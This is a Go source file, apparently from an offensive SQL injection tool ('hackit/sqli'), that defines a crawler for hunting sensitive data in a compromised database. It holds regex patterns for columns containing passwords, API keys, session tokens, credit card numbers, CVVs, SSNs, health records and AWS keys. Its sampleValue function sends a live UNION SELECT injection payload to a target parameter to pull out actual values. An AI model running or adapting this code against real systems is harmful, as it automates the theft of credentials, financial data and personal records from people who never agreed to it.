package crawl

import (
	"fmt"
	"regexp"
	"strings"
	"hackit/sqli/go/utils"
)

// SensitiveCrawler detects sensitive data patterns in database columns and values
type SensitiveCrawler struct {
	engine     EngineInterface
	log        *utils.Logger
	patterns   []*SensitivePattern
}

// SensitivePattern defines a sensitive data pattern
type SensitivePattern struct {
	Name       string
	Category   string
	Risk       string
	Confidence float64
	ColRegex   *regexp.Regexp
	ValRegex   *regexp.Regexp
	MinLen     int
}

func NewSensitiveCrawler(e EngineInterface) *SensitiveCrawler {
	sc := &SensitiveCrawler{engine: e, log: e.GetLogger()}
	sc.initPatterns()
	return sc
}

func (sc *SensitiveCrawler) initPatterns() {
	sc.patterns = []*SensitivePattern{
		{Name: "Password", Category: "Credentials", Risk: "CRITICAL", Confidence: 0.98, ColRegex: regexp.MustCompile(`(?i)^(password|passwd|pwd|pass|user_pass|user_password)$`), ValRegex: nil, MinLen: 4},
		{Name: "Password Field", Category: "Credentials", Risk: "CRITICAL", Confidence: 0.85, ColRegex: regexp.MustCompile(`(?i)(password|passwd|pwd|pass_hash|pass_salt|hash_pass)`), ValRegex: nil, MinLen: 4},
		{Name: "API Key", Category: "Credentials", Risk: "CRITICAL", Confidence: 0.95, ColRegex: regexp.MustCompile(`(?i)^(api_key|apikey|api_secret|apisecret|api_token|apitoken|access_key|accesskey|secret_key|secretkey)$`), ValRegex: nil, MinLen: 8},
		{Name: "Token", Category: "Auth", Risk: "HIGH", Confidence: 0.8, ColRegex: regexp.MustCompile(`(?i)(token|jwt|bearer|auth_token|refresh_token|session_token)`), ValRegex: nil, MinLen: 6},
		{Name: "JWT Token", Category: "Auth", Risk: "HIGH", Confidence: 0.5, ColRegex: regexp.MustCompile(`(?i)(jwt|json_web_token)`), ValRegex: regexp.MustCompile(`^eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+$`), MinLen: 20},
		{Name: "Credit Card", Category: "Financial", Risk: "CRITICAL", Confidence: 0.9, ColRegex: regexp.MustCompile(`(?i)(credit_card|cc_number|card_number|card_no|ccn|pan)`), ValRegex: regexp.MustCompile(`^(?:\d[ -]*?){13,19}$`), MinLen: 13},
		{Name: "CVV", Category: "Financial", Risk: "CRITICAL", Confidence: 0.95, ColRegex: regexp.MustCompile(`(?i)^(cvv|cvc|cvv2|cvc2|card_cvv|card_cvc)$`), ValRegex: nil, MinLen: 3},
		{Name: "Email", Category: "PII", Risk: "HIGH", Confidence: 0.9, ColRegex: regexp.MustCompile(`(?i)(email|e-mail|mail|email_address|mail_address)`), ValRegex: regexp.MustCompile(`^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`), MinLen: 5},
		{Name: "Phone", Category: "PII", Risk: "HIGH", Confidence: 0.85, ColRegex: regexp.MustCompile(`(?i)(phone|mobile|cell|tel|telephone|phone_number|contact_no)`), ValRegex: nil, MinLen: 7},
		{Name: "SSN", Category: "PII", Risk: "CRITICAL", Confidence: 0.95, ColRegex: regexp.MustCompile(`(?i)^(ssn|social_security|socialsecurity|social_no|sin)$`), ValRegex: regexp.MustCompile(`^\d{3}-\d{2}-\d{4}$`), MinLen: 9},
		{Name: "National ID", Category: "PII", Risk: "CRITICAL", Confidence: 0.8, ColRegex: regexp.MustCompile(`(?i)(national_id|nid|identity_card|ktp|aadhaar|cnic|cpf)`), ValRegex: nil, MinLen: 8},
		{Name: "Passport", Category: "PII", Risk: "HIGH", Confidence: 0.8, ColRegex: regexp.MustCompile(`(?i)(passport|passport_no|passport_number)`), ValRegex: nil, MinLen: 6},
		{Name: "Date of Birth", Category: "PII", Risk: "HIGH", Confidence: 0.85, ColRegex: regexp.MustCompile(`(?i)^(dob|birth_date|birthday|date_of_birth|birth)$`), ValRegex: nil, MinLen: 6},
		{Name: "Address", Category: "PII", Risk: "MEDIUM", Confidence: 0.7, ColRegex: regexp.MustCompile(`(?i)^(address|addr|street|city|state|zip|postcode|postal_code)$`), ValRegex: nil, MinLen: 5},
		{Name: "Full Address", Category: "PII", Risk: "MEDIUM", Confidence: 0.6, ColRegex: regexp.MustCompile(`(?i)(address|location|shipping|billing|residence)`), ValRegex: nil, MinLen: 5},
		{Name: "Bank Account", Category: "Financial", Risk: "CRITICAL", Confidence: 0.85, ColRegex: regexp.MustCompile(`(?i)(bank_account|account_no|account_number|iban|swift|bic|routing)`), ValRegex: nil, MinLen: 8},
		{Name: "Salary", Category: "HR", Risk: "HIGH", Confidence: 0.9, ColRegex: regexp.MustCompile(`(?i)^(salary|wage|income|bonus|compensation|pay_rate|hourly_rate)$`), ValRegex: nil, MinLen: 3},
		{Name: "Health", Category: "Medical", Risk: "CRITICAL", Confidence: 0.8, ColRegex: regexp.MustCompile(`(?i)(medical|diagnosis|patient|health_record|prescription|treatment)`), ValRegex: nil, MinLen: 5},
		{Name: "Session", Category: "Auth", Risk: "HIGH", Confidence: 0.8, ColRegex: regexp.MustCompile(`(?i)^(session|session_id|sessionid|sid|session_key)$`), ValRegex: nil, MinLen: 8},
		{Name: "Cookies", Category: "Auth", Risk: "HIGH", Confidence: 0.8, ColRegex: regexp.MustCompile(`(?i)(cookie|cookie_value|php_session|session_token)`), ValRegex: nil, MinLen: 5},
		{Name: "Private Key", Category: "Credentials", Risk: "CRITICAL", Confidence: 0.9, ColRegex: regexp.MustCompile(`(?i)(private_key|privkey|privatekey|secret_key|secretkey)`), ValRegex: regexp.MustCompile(`^-----BEGIN`), MinLen: 20},
		{Name: "Connection String", Category: "Infrastructure", Risk: "CRITICAL", Confidence: 0.9, ColRegex: regexp.MustCompile(`(?i)(connection_string|connstr|dsn|database_url|db_url)`), ValRegex: nil, MinLen: 10},
		{Name: "AWS Key", Category: "Cloud", Risk: "CRITICAL", Confidence: 0.9, ColRegex: regexp.MustCompile(`(?i)(aws_access|aws_secret|aws_key|s3_key|s3_secret)`), ValRegex: regexp.MustCompile(`AKIA[0-9A-Z]{16}`), MinLen: 16},
		{Name: "OTP/2FA", Category: "Auth", Risk: "CRITICAL", Confidence: 0.9, ColRegex: regexp.MustCompile(`(?i)^(otp|pin|mfa|tfa|two_factor|2fa|verification_code)$`), ValRegex: nil, MinLen: 3},
		{Name: "IP Address", Category: "Infrastructure", Risk: "LOW", Confidence: 0.5, ColRegex: regexp.MustCompile(`(?i)(ip_address|ip_addr|client_ip|remote_ip|host)`), ValRegex: nil, MinLen: 7},
		{Name: "Backup/Dump", Category: "Data", Risk: "HIGH", Confidence: 0.7, ColRegex: regexp.MustCompile(`(?i)(backup|dump|snapshot|archive|export)`), ValRegex: nil, MinLen: 5},
	}
}

// ScanColumn checks a column against all sensitive patterns
func (sc *SensitiveCrawler) ScanColumn(database, table string, col ColumnInfo) []SensitiveFinding {
	var findings []SensitiveFinding

	for _, p := range sc.patterns {
		if p.ColRegex.MatchString(col.Name) {
			finding := SensitiveFinding{
				Database:   database,
				Table:      table,
				Column:     col.Name,
				DataType:   col.Type,
				Confidence: p.Confidence,
				Category:   p.Category,
				Risk:       p.Risk,
			}

			// Try to get a sample value
			if sc.engine != nil {
				sample := sc.sampleValue(database, table, col.Name)
				if sample != "" {
					finding.Sample = sc.truncateSample(sample)
					// If we have a value regex, validate and increase confidence
					if p.ValRegex != nil && p.ValRegex.MatchString(sample) {
						finding.Confidence = finding.Confidence * 1.1
						if finding.Confidence > 1.0 {
							finding.Confidence = 1.0
						}
					}
				}
			}

			findings = append(findings, finding)
		}
	}

	return findings
}

// ScanValue checks an actual value against all patterns
func (sc *SensitiveCrawler) ScanValue(database, table, column, value string) *SensitiveFinding {
	for _, p := range sc.patterns {
		if p.ValRegex != nil && p.ValRegex.MatchString(value) {
			return &SensitiveFinding{
				Database:   database,
				Table:      table,
				Column:     column,
				DataType:   "value",
				Sample:     sc.truncateSample(value),
				Confidence: p.Confidence,
				Category:   p.Category,
				Risk:       p.Risk,
			}
		}
	}
	return nil
}

// BatchScanTable scans all column values in a table for sensitive data
func (sc *SensitiveCrawler) BatchScanTable(param, dbms, database, table string, columns []ColumnInfo, data [][]string) []SensitiveFinding {
	var findings []SensitiveFinding

	for _, row := range data {
		for ci, val := range row {
			if ci < len(columns) && len(val) > 0 {
				f := sc.ScanValue(database, table, columns[ci].Name, val)
				if f != nil {
					findings = append(findings, *f)
				}
			}
		}
	}
	return findings
}

func (sc *SensitiveCrawler) sampleValue(database, table, column string) string {
	payload := fmt.Sprintf("' UNION SELECT %s FROM `%s`.`%s` LIMIT 1-- -", column, database, table)
	body, _, _, err := sc.engine.Request(payload, "id")
	if err != nil {
		return ""
	}

	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) > 0 && len(line) < 200 && !strings.HasPrefix(line, "<") {
			return line
		}
	}
	return ""
}

func (sc *SensitiveCrawler) truncateSample(s string) string {
	if len(s) > 100 {
		return s[:50] + "..." + s[len(s)-47:]
	}
	return s
}

// GetSensitiveColumns returns all column names across all databases that match sensitive patterns
func (sc *SensitiveCrawler) GetSensitiveColumns(databases map[string]*DatabaseInfo) []SensitiveFinding {
	var all []SensitiveFinding
	for dbName, dbInfo := range databases {
		for _, tblInfo := range dbInfo.Tables {
			for _, col := range tblInfo.Columns {
				findings := sc.ScanColumn(dbName, tblInfo.Name, col)
				all = append(all, findings...)
			}
		}
	}
	return all
}

// SummaryByRisk groups findings by risk level
func (sc *SensitiveCrawler) SummaryByRisk(findings []SensitiveFinding) map[string][]SensitiveFinding {
	result := map[string][]SensitiveFinding{
		"CRITICAL": {},
		"HIGH":     {},
		"MEDIUM":   {},
		"LOW":      {},
	}
	for _, f := range findings {
		result[f.Risk] = append(result[f.Risk], f)
	}
	return result
}

// SummaryByCategory groups findings by category
func (sc *SensitiveCrawler) SummaryByCategory(findings []SensitiveFinding) map[string][]SensitiveFinding {
	result := make(map[string][]SensitiveFinding)
	for _, f := range findings {
		result[f.Category] = append(result[f.Category], f)
	}
	return result
}
